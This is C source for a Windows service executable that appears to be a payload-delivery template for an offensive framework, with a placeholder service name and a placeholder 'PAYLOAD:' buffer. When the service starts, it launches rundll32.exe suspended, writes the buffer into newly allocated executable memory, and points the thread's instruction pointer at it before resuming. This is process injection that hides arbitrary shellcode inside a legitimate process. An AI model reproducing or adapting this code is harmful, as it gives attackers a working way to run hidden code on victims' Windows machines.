#define WIN32_LEAN_AND_MEAN
#include <windows.h>

#define SCSIZE 8192

char cServiceName[32] = "SERVICENAME";

char bPayload[SCSIZE] = "PAYLOAD:";

SERVICE_STATUS ss;

SERVICE_STATUS_HANDLE hStatus = NULL;

#if BUILDMODE == 2
/* hand-rolled bzero allows us to avoid including ms vc runtime */
void inline_bzero(void *p, size_t l)
{
	BYTE *q = (BYTE *)p;
	size_t x = 0;
	for (x = 0; x < l; x++)
		*(q++) = 0x00;
}

#endif

/*
 *
 */
BOOL ServiceHandler( DWORD dwControl )
{
	if( dwControl == SERVICE_CONTROL_STOP || dwControl == SERVICE_CONTROL_SHUTDOWN )
	{
		ss.dwWin32ExitCode = 0;
		ss.dwCurrentState  = SERVICE_STOPPED;
	}
	return SetServiceStatus( hStatus, &ss );
}

/*
 *
 */
VOID ServiceMain( DWORD dwNumServicesArgs, LPSTR * lpServiceArgVectors )
{
	CONTEXT Context;
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	LPVOID lpPayload = NULL;

	inline_bzero( &ss, sizeof(SERVICE_STATUS) );
	inline_bzero( &si, sizeof(STARTUPINFO) );
	inline_bzero( &pi, sizeof(PROCESS_INFORMATION) );

	si.cb = sizeof(STARTUPINFO);

	ss.dwServiceType = SERVICE_WIN32_SHARE_PROCESS;

	ss.dwCurrentState = SERVICE_START_PENDING;

	ss.dwControlsAccepted = SERVICE_ACCEPT_STOP|SERVICE_ACCEPT_SHUTDOWN;

	hStatus = RegisterServiceCtrlHandler( (LPCSTR)&cServiceName, (LPHANDLER_FUNCTION)ServiceHandler );

	if ( hStatus )
	{
		ss.dwCurrentState = SERVICE_RUNNING;

		SetServiceStatus( hStatus, &ss );

		if( CreateProcess( NULL, "rundll32.exe", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi ) )
		{
			Context.ContextFlags = CONTEXT_FULL;

			GetThreadContext( pi.hThread, &Context );

			lpPayload = VirtualAllocEx( pi.hProcess, NULL, SCSIZE, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE );
			if( lpPayload )
			{
				WriteProcessMemory( pi.hProcess, lpPayload, &bPayload, SCSIZE, NULL );
#ifdef _WIN64
				Context.Rip = (ULONG_PTR)lpPayload;
#else
				Context.Eip = (ULONG_PTR)lpPayload;
#endif
				SetThreadContext( pi.hThread, &Context );
			}

			ResumeThread( pi.hThread );

			CloseHandle( pi.hThread );

			CloseHandle( pi.hProcess );
		}

		ServiceHandler( SERVICE_CONTROL_STOP );

		ExitProcess( 0 );
	}
}

/*
 *
 */
void main()
{
	SERVICE_TABLE_ENTRY st[] =
		{
			{ (LPSTR)&cServiceName, (LPSERVICE_MAIN_FUNCTIONA)&ServiceMain },
			{ NULL, NULL }
		};
	StartServiceCtrlDispatcher( (SERVICE_TABLE_ENTRY *)&st );
	return;
}
